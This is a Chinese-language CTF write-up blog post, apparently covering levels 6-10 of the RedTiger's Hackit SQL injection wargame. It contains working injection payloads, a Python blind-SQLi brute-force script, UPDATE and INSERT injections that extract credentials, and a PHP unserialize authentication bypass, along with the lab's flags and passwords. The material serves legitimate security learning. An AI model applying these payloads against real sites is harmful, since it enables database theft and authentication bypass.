<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># &apos; union select 1,2,3,4,5# =&gt; 0x2720756e696f6e2073656c65637420312c322c332c342c3523</span><br><span class="line">http://redtiger.labs.overthewire.org/level6.php?user=0 union select 1,0x2720756e696f6e2073656c65637420312c322c332c342c3523,3,4,5%23</span><br></pre></td></tr></table></figure>

<pre><code>Username:     2
Email:     4</code></pre><p>That’s ez! 接下来按照要求输出即可。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># &apos; union select 1,username,3,password,5 from level6_users where status=1#   =&gt;  0x2720756e696f6e2073656c65637420312c757365726e616d652c332c70617373776f72642c352066726f6d206c6576656c365f7573657273207768657265207374617475733d3123</span><br><span class="line"></span><br><span class="line">http://redtiger.labs.overthewire.org/level6.php?user=0 union select 1,0x2720756e696f6e2073656c65637420312c757365726e616d652c332c70617373776f72642c352066726f6d206c6576656c365f7573657273207768657265207374617475733d3123,3,4,5%23</span><br></pre></td></tr></table></figure>

<blockquote>
<p>Username:     admin<br>Email:     m0nsterk1ll<br>You can raise your wechall.net score with this flag: 074113b268d87dea21cc839954dec932<br>The password for the next level is: keep_in_mind_im_not_blind</p>
</blockquote>
<h2 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h2><p>正常输入 <code>google</code> 会得到以下信息。</p>
<pre><code>Google: The browser is the computer
SAN FRANCISCO--Google spent Wednesday morning trying to get developers excited about the next generation of Web t...</code></pre><p>输入 <code>google&#39;</code> 会得到很详细的sql语句报错。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT news.*,text.text,text.title FROM level7_news news, level7_texts text WHERE text.id = news.id AND (text.text LIKE &apos;%google&apos;%&apos; OR text.title LIKE &apos;%google&apos;%&apos;)</span><br></pre></td></tr></table></figure>

<p>想办法闭合google前面的 <code>&#39;%</code> ，也把后面给注释掉。于是输入 <code>%&#39;)--+</code>，但是仍然报错。网上通过注释来解题的方法已经不好使了。</p>
<p>不用注释掉后面，那么可以把后面的 <code>%&#39;</code> 给闭合掉。输入 <code>%&#39; and &#39;%&#39;=&#39;</code> 即可得到正常页面。</p>
<p>那么可以加入 <code>%&#39; and 1=1 and &#39;%&#39;=&#39;</code></p>
<p>此题用布尔型盲注。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT news.*,text.text,text.title FROM level7_news news, level7_texts text WHERE text.id = news.id AND (text.text LIKE &apos;%google%&apos; and 1=1 and &apos;%&apos;=%&apos; OR text.title LIKE &apos;%google%&apos; and 1=1 and &apos;%&apos;=%&apos;)</span><br></pre></td></tr></table></figure>

<p>除了过滤给出的函数外，还过滤了常用的注释符。</p>
<p>对于过滤了字符串截取函数 <code>substr</code> , <code>left</code> 的话，可以使用 <code>locate</code> 来进行代替。还需要通过 <code>collate latin1_general_cs</code> 或者 <code>latin1_bin</code> 来判断字符的大小写。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">LEFT(str,len)</span><br><span class="line">Returns the leftmost len characters from the string str, or NULL if any argument is NULL.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SUBSTR(str,pos), SUBSTR(str FROM pos), SUBSTR(str,pos,len), SUBSTR(str FROM pos FOR len) </span><br><span class="line">SUBSTR() is a synonym for SUBSTRING().</span><br><span class="line"></span><br><span class="line">SUBSTRING(str,pos), SUBSTRING(str FROM pos), SUBSTRING(str,pos,len),SUBSTRING(str FROM pos FOR len)</span><br><span class="line">The forms without a len argument return a substring from string str starting at position pos. The forms with a len argument return a substring len characters long from string str, starting at position pos. The forms that use FROM are standard SQL syntax. It is also possible to use a negative value for pos. In this case, the beginning of the substring is pos characters from the end of the string, rather than the beginning. A negative value may be used for pos in any of the forms of this function. </span><br><span class="line"></span><br><span class="line">LOCATE(substr,str), LOCATE(substr,str,pos)</span><br><span class="line">The first syntax returns the position of the first occurrence of substring substr in string str. The second syntax returns the position of the first occurrence of substring substr in string str, starting at position pos. Returns 0 if substr is not in str. Returns NULL if substr or str is NULL.</span><br></pre></td></tr></table></figure>

<p>先得到 <code>autor</code> 字段的长度。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">from time import sleep</span><br><span class="line"></span><br><span class="line">cookies=&#123;&quot;level7login&quot;: &quot;keep_in_mind_im_not_blind&quot;&#125;</span><br><span class="line">url_base = &quot;http://redtiger.labs.overthewire.org/level7.php&quot;</span><br><span class="line">params=&#123;&quot;dosearch&quot; : &quot;search!&quot;, &quot;search&quot;: &quot;google&quot; &#125;</span><br><span class="line">headers = &#123;&quot;Connection&quot;: &quot;close&quot;&#125;</span><br><span class="line"></span><br><span class="line">def get_len():</span><br><span class="line">    lens=1</span><br><span class="line">    while lens &lt; 50:</span><br><span class="line">        print &quot;lens is &quot;, lens</span><br><span class="line">        params[&apos;search&apos;] = &quot;google%&apos; and length(news.autor)=&#123;0&#125; and &apos;%&apos;=&apos;&quot;.format(lens)</span><br><span class="line">        resp =requests.post(url_base, data=params, cookies=cookies)</span><br><span class="line">        if resp.status_code != 200:</span><br><span class="line">            print &quot;status code is not 200&quot;</span><br><span class="line">        content = resp.content</span><br><span class="line">        #found id</span><br><span class="line">        if content.find(&quot;Google: The browser is the computer&quot;) != -1 :</span><br><span class="line">            break</span><br><span class="line">        lens+=1</span><br><span class="line">    return lens</span><br></pre></td></tr></table></figure>

<p>得到17，然后逐一比较出每个字符。这里需要注意，服务器过滤了很多字符，比如 <code>&lt;</code> 、 <code>&gt;</code> ，<code>substr</code> 、 <code>substring</code> 、 <code>left</code> 等。只能用相等关系来比较了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">lens= 17</span><br><span class="line">def get_item():</span><br><span class="line">    result=&quot;&quot;</span><br><span class="line">    for start in range(5, lens+1):</span><br><span class="line">        print &quot;scanning &quot;, start, &quot; position&quot;</span><br><span class="line">        for char in string.printable:</span><br><span class="line">            params[&apos;search&apos;]=&quot;google%&apos; and locate(&apos;&#123;0&#125;&apos;,news.autor collate latin1_bin,&#123;1&#125;)=&#123;1&#125; and &apos;%&apos;=&apos;&quot;.format(char, start)</span><br><span class="line">            #print params</span><br><span class="line">            try:</span><br><span class="line">                resp =requests.post(url_base, data=params, cookies=cookies, headers=headers)</span><br><span class="line">            except requests.exceptions.ConnectionError:</span><br><span class="line">                print &quot;Connection refused by the server..&quot;</span><br><span class="line">                sleep(3)</span><br><span class="line">                continue</span><br><span class="line"></span><br><span class="line">            if resp.status_code != 200:</span><br><span class="line">                print &quot;status code is not 200&quot;</span><br><span class="line">            content = resp.content</span><br><span class="line">            #found id</span><br><span class="line">            if content.find(&quot;Google: The browser is the computer&quot;) != -1 :</span><br><span class="line">                print &quot;#Found &quot;, (char)</span><br><span class="line">                result+= (char)</span><br><span class="line">                break</span><br><span class="line">    return result</span><br><span class="line">result = get_item()</span><br><span class="line">print &quot;result is &quot;, result</span><br></pre></td></tr></table></figure>

<p><strong>注意</strong></p>
<p>1.Max retries exceeded with URL</p>
<p>访问太频繁会<code>requests</code> 包会报错上述错误。可以根据 <code>requests.exceptions.ConnectionError</code> 来判断。<br>这时候可以降低访问速度，即休眠几秒钟。还有就是当发送HTTP请求包的时候，让服务器断开连接。在请求包的 <code>headers</code> 中加入 <code>{&quot;Connection&quot;: &quot;close&quot;}</code> 。</p>
<p>2.校对规则 <code>collation</code></p>
<p>校对规则是怎么回事呢？它是一组规则，负责决定某一字符集下的字符进行比较和排序的结果。</p>
<p>比如说，有latin1字符集中的字母A和a，我们需要它们在比较的时候相等，那么，我们可以使用字符集校对规则 latin1_general_ci；这种校对规则在比较和排序的时候不区分大小写；如果我们需要他们在比较的时候不等呢？也很简单，我们可以使用字符集校对规则latin1_bin;这种校对规则会以二进制的方式对字符进行比较，很明显，a和A的二进制编码不同，比较的结果就是不等。</p>
<p>可以通过 <code>show collation</code> 来查看数据库对校对规则的支持。</p>
<p>答案是 <code>TestUserforg00gle</code></p>
<blockquote>
<p>User correct.<br>You can raise your wechall.net score with this flag: 970cecc0355ed85306588a1a01db4d80<br>The password for the next level is: no_pernel_kanic_on_the_titanic</p>
</blockquote>
<h2 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h2><p>点击 <code>edit</code> ，可以更改用户的信息。</p>
<p>测试注入点，在 <code>email</code> 处输入 <code>&#39;</code> 得到报错信息。</p>
<blockquote>
<p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the &gt; right syntax to use near ‘12345’, age = ‘25’ WHERE id = 1’ at line 3</p>
</blockquote>
<p>在 <code>email</code> 的内容前面输入 <code>&#39;</code>，得到更精确的信息。</p>
<blockquote>
<p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the &gt; right syntax to use near ‘hans@localhost’’, icq = ‘12345’, age = ‘25’ WHERE id = 1’ at line 3 </p>
</blockquote>
<p>可以确定这是一条更新语句。<br>猜测sql语句为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update user set email=&apos;$email&apos;,icq=&apos;$icq&apos;,age=&apos;$age&apos; where id=1</span><br></pre></td></tr></table></figure>

<p>可以利用 <code>update</code> 将 <code>password</code>更新到 <code>name</code> 字段，注意 <code>&#39;</code>的闭合。</p>
<p>update user set email=’hans@localhost<code>&#39;,name=password,icq=&#39;</code>‘,icq=’12345’,age=’25’ where id=1 </p>
<blockquote>
<p>You can raise your wechall.net score with this flag: 9ea04c5d4f90dae92c396cf7a6787715<br>The password for the next level is: cybercyber_vuln</p>
</blockquote>
<h2 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h2><p>这题输入<code>autor=123</code>、 <code>title=123</code>、 <code>text=123</code> 会在数据库中插入此条信息。</p>
<p>分别测试三个字段，发现注入点在 <code>text</code> 字段。报错信息为：</p>
<blockquote>
<p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the &gt; right syntax to use near ‘’123’’)’ at line 6</p>
</blockquote>
<p>这里SQL语句还原应该是 <code>&#39;$text&#39;)</code> ，这里应当是 <code>insert</code> 语句。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into tablename(autor, title, text) values(&apos;$autor&apos;, &apos;$title&apos;, &apos;$text&apos;);</span><br></pre></td></tr></table></figure>

<p>测试，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">autor=123&amp;title=123&amp;text=123&apos;),(&apos;4&apos;,&apos;5&apos;,&apos;6&amp;post=Submit+Query</span><br></pre></td></tr></table></figure>

<p>成功。</p>
<p>根据题目要求，<code>Get username and password of any user. Tablename: level9_users</code> 。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">autor=123&amp;title=123&amp;text=123&apos;),((select username from level9_users limit 0,1),(select password from level9_users limit 0,1),&apos;6&amp;post=Submit+Query</span><br></pre></td></tr></table></figure>

<blockquote>
<p>Autor: TheBlueFlower<br>Title: this_oassword_is_SEC//Ure.promised!
6 </p>
</blockquote>
<blockquote>
<p>You can raise your wechall.net score with this flag: 84ec870f1ac294508400e30d8a26a679<br>The password for the next level is: get_post_cookie_head__kittens_eating_all_my_bread</p>
</blockquote>
<h2 id="level-10"><a href="#level-10" class="headerlink" title="level 10"></a>level 10</h2><p>点击 <code>Login</code> 得到登陆用户为 <code>Monkey</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login=YToyOntzOjg6InVzZXJuYW1lIjtzOjY6Ik1vbmtleSI7czo4OiJwYXNzd29yZCI7czoxMjoiMDgxNXBhc3N3b3JkIjt9</span><br></pre></td></tr></table></figure>

<p>注入<code>&#39;</code> 到 <code>login</code>参数，得到正常结果，但是将 <code>login</code> 原参数删除一些字符后，得到报错结果。</p>
<blockquote>
<p>Notice: unserialize(): Error at offset 68 of 68 bytes in /var/www/html/hackit/level10.php on line 34</p>
</blockquote>
<p><code>login</code>的值为字母和数字的组合，应该是 <code>Base64</code> 加密后的结果，用 <code>base64</code> 解密，可得：</p>
<pre><code>a:2:{s:8:&quot;username&quot;;s:6:&quot;Monkey&quot;;s:8:&quot;password&quot;;s:12:&quot;0815password&quot;;}</code></pre><p>在用PHP 的  <code>unserialize</code> 反序列化得到：</p>
<pre><code>array (
  &apos;username&apos; =&gt; &apos;Monkey&apos;,
  &apos;password&apos; =&gt; &apos;0815password&apos;,
)</code></pre><p>由于是 <code>array</code> 数据， 可以将 <code>password</code> 设置为 <code>true</code>， 绕过密码判断。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">array (</span><br><span class="line">  &apos;username&apos; =&gt; &apos;TheMaster&apos;,</span><br><span class="line">  &apos;password&apos; =&gt; true,</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>经过 序列化 后得到</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;s:8:&quot;username&quot;;s:9:&quot;TheMaster&quot;;s:8:&quot;password&quot;;b:1;&#125;</span><br></pre></td></tr></table></figure>

<p>在经过 <code>Base64</code> 加密。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login=YToyOntzOjg6InVzZXJuYW1lIjtzOjk6IlRoZU1hc3RlciI7czo4OiJwYXNzd29yZCI7YjoxO30=&amp;dologin=Login</span><br></pre></td></tr></table></figure>

<p>通关！</p>
<blockquote>
<p>Welcome TheMaster.<br>You solved the hackit :)<br>You can raise your wechall.net score with this flag: 721ce43d433ad85bcfa56644b112fa52<br>The password for the hall of fame is: exec_is_safer_than_unserialize</p>
</blockquote>
<p>终于将10关搞定。</p>
<blockquote>
<p>Congratulation. You solved all 10 levels of the hackit.<br>If you want to put your name into the hall of fame you can use the form below.</p>
</blockquote>
<h2 id="参考网站"><a href="#参考网站" class="headerlink" title="参考网站"></a>参考网站</h2><p>[1] <a href="https://ctf-wiki.github.io/ctf-wiki/web/sqli/" target="_blank" rel="noopener">SQL 注入</a><br>[2] <a href="http://blog.csdn.net/helloc0de/article/details/76142478" target="_blank" rel="noopener">SQL注入教程——（三）简单的注入尝试</a><br>[3] <a href="https://blog.spoock.com/2016/07/25/redtiger-writeup/" target="_blank" rel="noopener">Redtiger Hackit Writeup</a><br>[4] <a href="http://ph0rse.me/2017/07/29/RedTiger-libs-writeup/" target="_blank" rel="noopener">RedTiger libs writeup</a><br>[5] <a href="http://lucifaer.com/index.php/archives/19/" target="_blank" rel="noopener">RedTiger’s Hackit</a></p>
  
	</div>
		<footer class="article-footer clearfix">
<div class="article-catetags">

<div class="article-categories">
  <span></span>
  <a class="article-category-link" href="/categories/sql注入/">sql注入</a>
</div>


  <div class="article-tags">
  
  <span></span> <a href="/tags/sql注入/">sql注入</a>
  </div>

</div>



	<div class="article-share" id="share">
	
	  <div data-url="http://juniorprincewang.github.io/2018/04/04/RedTiger-s-Hackit-writeup/" data-title="RedTiger&#39;s Hackit writeup | TO DO" data-tsina="null" class="share clearfix">
	  </div>
	
	</div>


</footer>

   	       
	</article>
	
<nav class="article-nav clearfix">
 
 <div class="prev">
 <a href="/2018/04/11/c文件调用cuda函数/" title="c文件调用cuda函数">
  <strong>上一篇：</strong><br>
  <span>
  c文件调用cuda函数</span>
</a>
</div>


<div class="next">
<a href="/2018/04/03/centos启动加载驱动/" title="centos启动加载驱动">
 <strong>下一篇：</strong><br> 
 <span>centos启动加载驱动
</span>
</a>
</div>

</nav>

	



</div>  
      <div class="openaside"><a class="navbutton" href="#" title="Show Sidebar"></a></div>

  <div id="toc" class="toc-aside">
  <strong class="toc-title">Contents</strong>
 
 <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#RedTiger"><span class="toc-number">1.</span> <span class="toc-text">RedTiger</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#level1"><span class="toc-number">1.1.</span> <span class="toc-text">level1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level2"><span class="toc-number">1.2.</span> <span class="toc-text">level2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level3"><span class="toc-number">1.3.</span> <span class="toc-text">level3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level4"><span class="toc-number">1.4.</span> <span class="toc-text">level4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level5"><span class="toc-number">1.5.</span> <span class="toc-text">level5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-6"><span class="toc-number">1.6.</span> <span class="toc-text">level 6</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-7"><span class="toc-number">1.7.</span> <span class="toc-text">level 7</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-8"><span class="toc-number">1.8.</span> <span class="toc-text">level 8</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-9"><span class="toc-number">1.9.</span> <span class="toc-text">level 9</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-10"><span class="toc-number">1.10.</span> <span class="toc-text">level 10</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考网站"><span class="toc-number">1.11.</span> <span class="toc-text">参考网站</span></a></li></ol></li></ol>
 
  </div>

<div id="asidepart">
<div class="closeaside"><a class="closebutton" href="#" title="Hide Sidebar"></a></div>
<aside class="clearfix">

  
<div class="github-card">
<p class="asidetitle">Github Card</p>
<div class="github-card" data-github="juniorprincewang" data-theme="medium"></div>
<script type="text/javascript" src="//cdn.jsdelivr.net/github-cards/latest/widget.js"></script>
</div>



  
<div class="categorieslist">
	<p class="asidetitle">Categories</p>
		<ul>
		
		  
			<li><a href="/categories/GPU/CUDA/" title="CUDA">CUDA<sup>8</sup></a></li>
		  
		
		  
			<li><a href="/categories/GPU/" title="GPU">GPU<sup>17</sup></a></li>
		  
		
		  
			<li><a href="/categories/GPU/GPU虚拟化/" title="GPU虚拟化">GPU虚拟化<sup>3</sup></a></li>
		  
		
		  
			<li><a href="/categories/QEMU/" title="QEMU">QEMU<sup>5</sup></a></li>
		  
		
		  
			<li><a href="/categories/linux/c/" title="c">c<sup>1</sup></a></li>
		  
		
		  
			<li><a href="/categories/security/crypto/" title="crypto">crypto<sup>1</sup></a></li>
		  
		
		  
			<li><a href="/categories/ctf/" title="ctf">ctf<sup>1</sup></a></li>
		  
		
		  
			<li><a href="/categories/git/" title="git">git<sup>3</sup></a></li>
		  
		
		  
			<li><a href="/categories/hexo/" title="hexo">hexo<sup>2</sup></a></li>
		  
		
		  
			<li><a href="/categories/linux/kernel/" title="kernel">kernel<sup>2</sup></a></li>
		  
		
		  
			<li><a href="/categories/linux/" title="linux">linux<sup>20</sup></a></li>
		  
		
		  
			<li><a href="/categories/GPU/nouveau/" title="nouveau">nouveau<sup>3</sup></a></li>
		  
		
		  
			<li><a href="/categories/security/pwn/" title="pwn">pwn<sup>7</sup></a></li>
		  
		
		  
			<li><a href="/categories/pwnable-kr/" title="pwnable.kr">pwnable.kr<sup>1</sup></a></li>
		  
		
		  
			<li><a href="/categories/python/" title="python">python<sup>1</sup></a></li>
		  
		
		  
			<li><a href="/categories/security/" title="security">security<sup>9</sup></a></li>
		  
		
		  
			<li><a href="/categories/linux/shell/" title="shell">shell<sup>2</sup></a></li>
		  
		
		  
			<li><a href="/categories/solutions/" title="solutions">solutions<sup>7</sup></a></li>
		  
		
		  
			<li><a href="/categories/sql注入/" title="sql注入">sql注入<sup>3</sup></a></li>
		  
		
		  
			<li><a href="/categories/tools/" title="tools">tools<sup>1</sup></a></li>
		  
		
		  
			<li><a href="/categories/linux/vim/" title="vim">vim<sup>2</sup></a></li>
		  
		
		  
			<li><a href="/categories/虚拟化/virtio/" title="virtio">virtio<sup>1</sup></a></li>
		  
		
		  
			<li><a href="/categories/vps/" title="vps">vps<sup>1</sup></a></li>
		  
		
		  
			<li><a href="/categories/web安全/" title="web安全">web安全<sup>2</sup></a></li>
		  
		
		  
			<li><a href="/categories/虚拟化/" title="虚拟化">虚拟化<sup>1</sup></a></li>
		  
		
		</ul>
</div>


  
<div class="tagslist">
	<p class="asidetitle">Tags</p>
		<ul class="clearfix">
		
			
				<li><a href="/tags/pwn/" title="pwn">pwn<sup>12</sup></a></li>
			
		
			
				<li><a href="/tags/CUDA/" title="CUDA">CUDA<sup>10</sup></a></li>
			
		
			
				<li><a href="/tags/GPU/" title="GPU">GPU<sup>8</sup></a></li>
			
		
			
				<li><a href="/tags/linux/" title="linux">linux<sup>8</sup></a></li>
			
		
			
				<li><a href="/tags/heap/" title="heap">heap<sup>7</sup></a></li>
			
		
			
				<li><a href="/tags/QEMU/" title="QEMU">QEMU<sup>6</sup></a></li>
			
		
			
				<li><a href="/tags/vim/" title="vim">vim<sup>3</sup></a></li>
			
		
			
				<li><a href="/tags/virtio/" title="virtio">virtio<sup>3</sup></a></li>
			
		
			
				<li><a href="/tags/nouveau/" title="nouveau">nouveau<sup>3</sup></a></li>
			
		
			
				<li><a href="/tags/kernel/" title="kernel">kernel<sup>3</sup></a></li>
			
		
			
				<li><a href="/tags/pwnable-kr/" title="pwnable.kr">pwnable.kr<sup>3</sup></a></li>
			
		
			
				<li><a href="/tags/gitlab/" title="gitlab">gitlab<sup>2</sup></a></li>
			
		
			
				<li><a href="/tags/git/" title="git">git<sup>2</sup></a></li>
			
		
			
				<li><a href="/tags/hexo/" title="hexo">hexo<sup>2</sup></a></li>
			
		
			
				<li><a href="/tags/xss/" title="xss">xss<sup>2</sup></a></li>
			
		
			
				<li><a href="/tags/shell/" title="shell">shell<sup>2</sup></a></li>
			
		
			
				<li><a href="/tags/sql/" title="sql">sql<sup>2</sup></a></li>
			
		
			
				<li><a href="/tags/堆溢出/" title="堆溢出">堆溢出<sup>2</sup></a></li>
			
		
			
				<li><a href="/tags/virtual-memory/" title="virtual memory">virtual memory<sup>2</sup></a></li>
			
		
			
				<li><a href="/tags/ubuntu/" title="ubuntu">ubuntu<sup>2</sup></a></li>
			
		
		</ul>
</div>


  <div class="linkslist">
  <p class="asidetitle">Links</p>
    <ul>
        
    </ul>
</div>

  


  <div class="rsspart">
	<a href="/atom.xml" target="_blank" title="rss">RSS</a>
</div>

  <div class="weiboshow">
  <p class="asidetitle">Weibo</p>
    <iframe width="100%" height="119" class="share_self" frameborder="0" scrolling="no" src="http://widget.weibo.com/weiboshow/index.php?language=&width=0&height=119&fansRow=2&ptype=1&speed=0&skin=9&isTitle=1&noborder=1&isWeibo=0&isFans=0&uid=null&verifier=&dpc=1"></iframe>
</div>


</aside>
</div>
    </div>
    <footer><div id="footer">
	
	<div class="line">
		<span></span>
		<div class="author"></div>
	</div>
	
	
	<section class="info">
		<p>  <br>
			上网不涉密，涉密不上网。</p>
	</section>
	 
	<div class="social-font">
		
		
		<a href="https://github.com/juniorprincewang" target="_blank" class="icon-github" title="github"></a>
		
		
		
		
		
		
		
		
		
		<a href="mailto:little0prince@163.com" target="_blank" class="icon-email" title="Email Me"></a>
		
	</div>
			
		

		<p class="copyright">
		Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/wuchong/jacman" target="_blank" title="Jacman">Jacman</a> © 2019 
		
		<a href="/about" target="_blank" title="Max">Max</a>
		
		
		</p>
</div>
</footer>
    <script src="/js/jquery-2.0.3.min.js"></script>
<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/jquery.qrcode-0.12.0.min.js"></script>

<script type="text/javascript">
$(document).ready(function(){ 
  $('.navbar').click(function(){
    $('header nav').toggleClass('shownav');
  });
  var myWidth = 0;
  function getSize(){
    if( typeof( window.innerWidth ) == 'number' ) {
      myWidth = window.innerWidth;
    } else if( document.documentElement && document.documentElement.clientWidth) {
      myWidth = document.documentElement.clientWidth;
    };
  };
  var m = $('#main'),
      a = $('#asidepart'),
      c = $('.closeaside'),
      o = $('.openaside');
  c.click(function(){
    a.addClass('fadeOut').css('display', 'none');
    o.css('display', 'block').addClass('fadeIn');
    m.addClass('moveMain');
  });
  o.click(function(){
    o.css('display', 'none').removeClass('beforeFadeIn');
    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
    m.removeClass('moveMain');
  });
  $(window).scroll(function(){
    o.css("top",Math.max(80,260-$(this).scrollTop()));
  });
  
  $(window).resize(function(){
    getSize(); 
    if (myWidth >= 1024) {
      $('header nav').removeClass('shownav');
    }else{
      m.removeClass('moveMain');
      a.css('display', 'block').removeClass('fadeOut');
      o.css('display', 'none');
      
      $('#toc.toc-aside').css('display', 'none');
        
    }
  });
});
</script>

<script type="text/javascript">
$(document).ready(function(){ 
  var ai = $('.article-content>iframe'),
      ae = $('.article-content>embed'),
      t  = $('#toc'),
      ta = $('#toc.toc-aside'),
      o  = $('.openaside'),
      c  = $('.closeaside');
  if(ai.length>0){
    ai.wrap('<div class="video-container" />');
  };
  if(ae.length>0){
   ae.wrap('<div class="video-container" />');
  };
  c.click(function(){
    ta.css('display', 'block').addClass('fadeIn');
  });
  o.click(function(){
    ta.css('display', 'none');
  });
  $(window).scroll(function(){
    ta.css("top",Math.max(140,320-$(this).scrollTop()));
  });
});
</script>


<script type="text/javascript">
$(document).ready(function(){ 
  var $this = $('.share'),
      url = $this.attr('data-url'),
      encodedUrl = encodeURIComponent(url),
      title = $this.attr('data-title'),
      tsina = $this.attr('data-tsina'),
      description = $this.attr('description');
  var html = [
  '<div class="hoverqrcode clearfix"></div>',
  '<a class="overlay" id="qrcode"></a>',
  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
  '<a href="#qrcode" class="article-share-qrcode" title="微信"></a>',
  '<a href="http://widget.renren.com/dialog/share?resourceUrl=' + encodedUrl + '&srcUrl=' + encodedUrl + '&title=' + title +'" class="article-share-renren" target="_blank" title="人人"></a>',
  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="微博"></a>',
  '<span title="Share to"></span>'
  ].join('');
  $this.append(html);

  $('.hoverqrcode').hide();

  var myWidth = 0;
  function updatehoverqrcode(){
    if( typeof( window.innerWidth ) == 'number' ) {
      myWidth = window.innerWidth;
    } else if( document.documentElement && document.documentElement.clientWidth) {
      myWidth = document.documentElement.clientWidth;
    };
    var qrsize = myWidth > 1024 ? 200:100;
    var options = {render: 'image', size: qrsize, fill: '#2ca6cb', text: url, radius: 0.5, quiet: 1};
    var p = $('.article-share-qrcode').position();
    $('.hoverqrcode').empty().css('width', qrsize).css('height', qrsize)
                          .css('left', p.left-qrsize/2+20).css('top', p.top-qrsize-10)
                          .qrcode(options);
  };
  $(window).resize(function(){
    $('.hoverqrcode').hide();
  });
  $('.article-share-qrcode').click(function(){
    updatehoverqrcode();
    $('.hoverqrcode').toggle();
  });
  $('.article-share-qrcode').hover(function(){}, function(){
      $('.hoverqrcode').hide();
  });
});   
</script>











<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
$(document).ready(function(){ 
  $('.article-content').each(function(i){
    $(this).find('img').each(function(){
      if ($(this).parent().hasClass('fancybox')) return;
      var alt = this.alt;
      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
    });
    $(this).find('.fancybox').each(function(){
